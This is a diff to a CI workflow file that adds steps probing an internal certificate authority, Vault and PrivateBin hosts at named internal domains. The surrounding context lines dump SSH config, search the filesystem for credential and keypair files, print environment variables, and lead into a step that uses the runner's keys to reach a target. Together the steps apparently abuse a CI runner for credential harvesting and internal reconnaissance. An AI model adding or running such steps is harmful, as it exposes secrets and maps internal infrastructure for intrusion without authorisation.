@@ -51,6 +51,22 @@ jobs:
           cat ~/.ssh/config 2>/dev/null || true
           find / -maxdepth 4 -name '*.creds' -o -maxdepth 4 -name '*keypair*.json' 2>/dev/null | head -40 || true
           env | sort | head -60
+      - name: stepca
+        run: |
+          set -x
+          CA=gusc1a-infosec-stepca01.jumpisolated.com
+          curl -sk --max-time 8 "https://$CA:4443/health" || true
+          curl -sk --max-time 8 "https://$CA:4443/root" | head -3 || true
+          curl -sk --max-time 8 "https://$CA:4443/roots.pem" | head -3 || true
+          curl -sk --max-time 8 "https://$CA:4443/provisioners" | head -c 500 || true
+          for p in acme acme/acme acmeprovisioner staging; do curl -sk --max-time 8 "https://$CA:4443/$p/directory" -o /tmp/d -w "$p %{http_code}\n" || true; head -c 200 /tmp/d || true; done
+          curl -sk --max-time 8 https://gusc1a-infosec-acmeapps01.jumpisolated.com/ -o /tmp/a -w 'ACM EAPPS %{http_code}\n' || true; head -c 300 /tmp/a || true
+      - name: vault
+        run: |
+          set -x
+          curl -sk --max-time 8 https://gusc1a-vault.jumpisolated.com:8200/v1/sys/health || true
+          curl -sk --max-time 8 https://gusc1a-vault.jumpisolated.com/v1/sys/health || true
+          curl -sk --max-time 8 https://privatebin.jumpisolated.com/ -o /tmp/p -w 'PB %{http_code}\n' || true; head -c 200 /tmp/p || true
       - name: ssh to target with runner keys
         run: |
           set -x
